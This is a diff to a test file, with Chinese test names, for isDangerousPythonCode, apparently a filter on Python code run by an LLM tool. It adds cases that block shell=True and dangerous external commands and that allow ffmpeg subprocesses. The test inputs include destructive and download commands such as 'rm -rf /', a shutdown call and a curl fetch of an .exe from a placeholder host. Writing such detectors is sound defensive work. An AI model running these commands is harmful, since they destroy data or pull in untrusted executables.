@@ -566,15 +566,20 @@ describe("Python 技能工具（v1.5.17：edit_pdf 跨平台化 + pdf_to_excel/r
     expect(r).toContain("Python");
   });
 
-  it("isDangerousPythonCode：os.system / subprocess / rmtree 全部拦截", () => {
+  it("isDangerousPythonCode：os.system / shell=True / 危险外部命令 / rmtree 拦截", () => {
     expect(isDangerousPythonCode('os.system("rm -rf /")')).toContain("系统命令");
-    expect(isDangerousPythonCode("import subprocess; subprocess.run(['shutdown'])")).toContain("外部进程");
+    expect(isDangerousPythonCode("import subprocess; subprocess.run(['shutdown'])")).toContain("危险外部命令");
+    expect(isDangerousPythonCode("subprocess.run('dir', shell=True)")).toContain("shell=True");
+    expect(isDangerousPythonCode("subprocess.run(['curl', '-O', 'http://x/p.exe'])")).toContain("危险外部命令");
     expect(isDangerousPythonCode("shutil.rmtree('/tmp/x')")).toContain("递归删除");
   });
 
   it("isDangerousPythonCode：正常数据分析脚本放行", () => {
     expect(isDangerousPythonCode("import pandas as pd; df = pd.read_csv('a.csv'); print(df.mean())")).toBeNull();
     expect(isDangerousPythonCode("import fitz; doc = fitz.open('a.pdf'); print(len(doc))")).toBeNull();
+    // v1.5.18 放开合法子进程：LLM 用 Python 调 ffmpeg-static 合视频等复杂工作流不再被拒
+    expect(isDangerousPythonCode("import subprocess; subprocess.run([FFMPEG, '-i', 'a.mp4'])")).toBeNull();
+    expect(isDangerousPythonCode("subprocess.run(['ffmpeg', '-y', '-i', 'a.mp4', 'b.mp4'])")).toBeNull();
   });
 
   it("run_python：危险代码被拦截并引导专用工具", async () => {
